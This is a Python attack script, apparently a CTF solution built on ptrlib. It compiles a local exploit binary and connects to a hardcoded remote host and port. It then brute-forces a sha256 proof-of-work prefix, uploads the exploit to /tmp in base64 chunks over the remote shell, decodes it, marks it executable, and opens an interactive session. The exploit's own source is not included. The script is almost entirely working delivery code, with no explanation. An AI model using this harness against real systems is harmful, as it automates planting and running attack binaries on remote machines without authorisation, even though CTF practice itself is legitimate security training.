from ptrlib import *
import time
import base64
import os

def run(cmd):
    sock.sendlineafter("$ ", cmd)
    sock.recvline()
    return

os.system("make")
with open("exploit", "rb") as f:
    payload = bytes2str(base64.b64encode(f.read()))

#sock = Process(["/bin/sh", "./start.sh"], cwd="../files")
HOST = os.getenv("HOST", "153.125.128.105")
PORT = os.getenv("PORT", "9002")
sock = Socket(HOST, int(PORT))

import itertools
import hashlib
import string

table = string.ascii_letters + string.digits + "._"

r = sock.recvregex("sha256\(\"\?\?\?\?(.+)\"\) = ([0-9a-f]+)")
suffix = r[0].decode()
hashval = r[1].decode()
print(suffix, hashval)

for v in itertools.product(table, repeat=4):
    if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
        prefix = ''.join(v)
        print("[+] Prefix = " + prefix)
        break
else:
    print("[-] Solution not found :thinking_face:")

sock.sendline(prefix)
sock.recv()

run('cd /tmp')
print("[+] Uploading...")
for i in range(0, len(payload), 512):
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))
run('base64 -d b64exp > exploit')
run('rm b64exp')
run('chmod +x exploit')

sock.interactive()
